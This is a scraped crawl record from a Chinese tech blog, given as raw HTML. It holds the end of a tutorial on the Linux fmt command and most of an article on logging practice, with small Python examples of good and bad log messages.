!important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f4032bdec2947540989-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f4032bdec2947540989-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f4032bdec2947540989-1\"><span class=\"crayon-v\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f4032bdec2947540989-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>下面是一个例子：</p>\n<p><a href=\"https://www.howtoforge.com/images/linux_fmt_command/big/fmt-s-option.png\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/b5087c0f6ec116a53f90d84902fe07cd.png\" alt=\"make fmt split long lines\"></a></p>\n<h3 id=\"toc_6\">Q5、如何在单词与单词之间，句子之间用空格分开？</h3>\n<p>fmt 命令提供了一个 <code>-u</code> 选项，这会在单词与单词之间用单个空格分开，句子之间用两个空格分开。你可以这样用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f4032bdec9839387595\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt -u [file-name]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f4032bdec9839387595-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f4032bdec9839387595-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f4032bdec9839387595-1\"><span class=\"crayon-v\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f4032bdec9839387595-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>注意，在我们的案例中，这个功能是默认开启的。</p>\n<h3 id=\"toc_7\">总结</h3>\n<p>没错，<code>fmt</code> 提供的功能不多，但不代表它的应用就不广泛。因为你永远不知道什么时候会用到它。在本教程中，我们已经讲解了 <code>fmt</code> 提供的主要选项。若想了解更多细节，请查看该工具的 <a href=\"https://linux.die.net/man/1/fmt\">man 页</a>。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113479\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113479votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113479\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/e35c32748c5bfe52651ccc7d9338d0da.png"], "title": "日志的艺术（The art of logging）", "fav_nums": 11, "url": "http://blog.jobbole.com/113413/", "create_date": "2018/01/02", "url_object_id": "ca3846b5e25e9357415c9c823f73b25b", "comment_nums": 4, "front_image_path": "full/456ebee8cee612d98b57ddd51097ea8c6f411717.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/xybaby/p/7954610.html\">xybaby</a>   </div><p>程序员学习每一门语言都是从打印“hello world”开始的，日志也是新手程序员学习、调试程序的一大利器。当项目上线之后，也会有各种各样的日志，比如记录用户的行为、服务器的状态、异常情况等等。打印日志似乎是一件很简单、不值得一提的事情。但是，当看到线上项目居然有这样的日志的时候，不禁想问问我们真的会打印日志吗？</p>\n<blockquote><p>***********************************</p>\n<p>Error Happened, F*ck</p>\n<p>User xxx can not login</p></blockquote>\n<p>在我看来，打印日志是一门艺术，而且长期被程序员所忽视，本文尝试回答以下几个问题，分享我对打印日志的一些思考：</p>\n<p>(1) why or when to log</p>\n<p>(2) what to log</p>\n<p>(3) how to log and tips</p>\n<p>注意：本文中会用<strong>“打印”</strong>日志来统一表示日志的输出，但不是我们狭义理解的输出到终端或者stdout、stderr， 而是泛指将日志内容输出到任何目标，包括但不限于终端、文件、网络传输。</p>\n<h1>why or when to log</h1>\n<p>为什么时候要打印日志，或者什么时候打印日志，在我看来是同一个问题，那就是打印日志的目的。不同的目的，决定了日志内容的格式，输出的频度，输出的目的地。那可能有哪些打印日志的原因？</p>\n<p>（1）调试开发</p>\n<p>目的是开发期调试程序使用，这种日志量比较大，且没有什么实质性的意义，只应该出现在开发期，而不应该在项目上线之后输出。如何控制这种类型的日志是否输出，后面也会详细讨论。</p>\n<p>（2）用户行为日志</p>\n<p>这种类型的日志，记录用户的操作行为，用于大数据分析，比如监控、风控、推荐等等。这种日志，一般是给其他团队分析使用，而且可能是多个团队，因此一般会有一定的格式要求，开发者应该按照这个格式来记录，便于其他团队的使用。当然，要记录哪些行为、操作，一般也是约定好的，因此，开发者主要是执行的角色。</p>\n<p>（3）程序运行日志</p>\n<p>记录程序的运行状况，特别是非预期的行为、异常情况，这种日志，主要是给开发、维护人员使用。什么时候记录，记录什么内容，完全取决于开发人员，开发者具有高度自主性。本文讨论的主要也是指这种类型的日志，因为作为一个服务端开发、运维人员，程序运行日志往往是解决线上问题的救命稻草。</p>\n<p>（4）记录系统或者机器的状态</p>\n<p>比如网络请求、系统CPU、内存、IO使用情况等等，这种日志主要是给运维人员使用，生成各种更直观的展现形式，在系统出问题的时候报警。</p>\n<h1>what to log</h1>\n<p>一条日志要包含哪些内容，我觉的应该包含 when、where、how、what、who、context，具体含义会在下面一个小节介绍。</p>\n<p>我们要记录日志，总是要在某个时机，比如用户的某个请求、某个网络调用、或者内部状态发生了改变。在后文中，统称为事件（event），即日志内容是对某个事件的描述。</p>\n<h2>when: the time event happens</h2>\n<p>when，就是我们打印日志的时间（时间戳），注意这里的时间指的是日志记录的事件的发生时间，而不是日志被最终输出的时间。比如如果日志的输出目标是文件，那么这里的when不是写入到文件的时间，因为往往有延迟。</p>\n<p>时间的重要性，在《<a href=\"http://book.mixu.net/distsys/time.html\" target=\"_blank\">Distributed systems for fun and profit</a>》中有很好的讲述。</p>\n<p>首先，时间可以被解读（Interpretaion）成具体的、现实的日期，让我们可以知道事件发生时的时间环境，比如出问题的时候是不是有什么活动、结合系统日志分析当时服务器的网络、CPU、IO是怎么样。具体的时间点也可以帮助我们分析事件的发生是不是存在某种规律，比如是不是每天、每周、每月的固定时间点都会出问题。</p>\n<p>其次，时间可以表示一个（一组）事件的持续时间（duration）。比如，可以监控处一段代码的执行时间，也可以记录一个网络请求的耗时。这个时间差也能给出我们很多信息，比如根据经验预判当时程序的运行状态，是否比较‘卡’。</p>\n<p>最后，时间代表了事件发生的顺序（order），我们将多个日志按照时间排序，这个顺序能帮助我们debug到底问题是怎么产生的，是按照什么样的时序。这对于多进程（多线程）、异步、分布式程序而言非常重要。虽然我们知道在分布式系统维护全局的时间（global clock）是很复杂的一件事情，但我们使用NTP协议，基本上能解决大部分的问题。</p>\n<h2>where: where the event happens</h2>\n<p>where，就是指日志是在哪里的被记录的，本质上来说，是事件的产生地点。根据情况，可以具体到是哪个模块、哪个文件，甚至是哪一个函数、哪一行代码。实践告知，至少应该包含模块信息。</p>\n<p>where的意义在于能够让自己或者其他程序员一眼就看出这条日志是在哪里产生的，这样就能大致定位问题处在哪里，而不用从日志内容全局grep代码</p>\n<h2>how：how importance of the event</h2>\n<p>how important，代表了事件的重要性，我们会打印很多各种类型的日志，但是不同的日志的重要性是不一样的。比如，调试日志是最不重要的，是不应该出现在线上项目的，但是程序运行报错日志却需要认真对待，因为代表程序已经出现了异常。即使是程序的报错日志，也有不同的紧急程度，一次网络请求超时跟子进程异常退出份量完全不一样。</p>\n<p>因此，每一条日志都应该有log level，log level代表了日志的重要性、紧急程度。不同的语言、框架的level细分有一定的差异，但都会包括debug，info，warn，error，fatal（critical）。其重要程度从名字就可以看出。</p>\n<p>当然，有时候，warn与error，或者error与fatal之间的界限不那么明显，这个需要在团队之间达成共识。在我们的线上项目，对于error、fatal级别的日志都会报警，如果出现了error日志，那么最迟需要第二天去处理，如果是fatal日志，即使是在大半夜，也得立刻起来分析、处理。</p>\n<h2>what：what is the log message</h2>\n<p>what是日志的主体内容，应该简明扼要的描述发生的什么事情。要求可以通过日志本身，而不是重新阅读产生日志的代码，来大致搞清楚发生了什么事情。所以，下面这个日志是不合格的：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37580a673046197686\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef user_login(username, password):\r\n    if not valid_username(username):\r\n        logger.warn('Error Happened')\r\n        return\r\n    # some others code</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a673046197686-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a673046197686-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a673046197686-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a673046197686-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a673046197686-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37580a673046197686-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">user_login</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a673046197686-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">valid_username</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a673046197686-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">warn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'Error Happened'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a673046197686-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a673046197686-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some others code</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n\n</div>\n<p>是的，我知道，出了问题了，但是日志应该告诉我出了什么问题，所以日志至少应该是这样的：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37580a67d401728594\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef user_login(username, password):\r\n    if not valid_username(username):\r\n        logger.warn('user_login failed due to unvalid_username')\r\n        return\r\n    # some others code</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a67d401728594-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a67d401728594-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a67d401728594-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a67d401728594-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a67d401728594-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37580a67d401728594-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">user_login</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a67d401728594-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">valid_username</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a67d401728594-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">warn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'user_login failed due to unvalid_username'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a67d401728594-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a67d401728594-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some others code</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n\n</div>\n<h2>who：the uniq identify</h2>\n<p>who代表了事件产生者的唯一标识（identity），用于区分同样的事件。特别是在服务器端，都是大量用户、请求的并发，如果日志内容不包含唯一标识信息，那么这条日志就会淹没在茫茫大海中，比如下面这条日志：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37580a681799262612\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef user_login(username, password):\r\n    # some code has check the username\r\n    if not valid_password(password) or not check_password(username, password):\r\n        logger.warn('user_login failed due to password')\r\n        return\r\n    # some others code</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a681799262612-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a681799262612-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a681799262612-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a681799262612-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a681799262612-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a681799262612-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37580a681799262612-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">user_login</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a681799262612-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some code has check the username</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a681799262612-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">valid_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">check_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a681799262612-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">warn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'user_login failed due to password'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a681799262612-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a681799262612-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some others code</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n\n</div>\n<p>上面的代码给出了出了什么问题，但是没有包含是谁出了问题，至少应该是</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37580a685094836972\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef user_login(username, password):\r\n    # some code has check the username\r\n    if not valid_password(password) or not check_password(username, password):\r\n        logger.warn('user_login failed due to password, username %s', username)\r\n        return</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a685094836972-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a685094836972-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a685094836972-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37580a685094836972-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37580a685094836972-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div 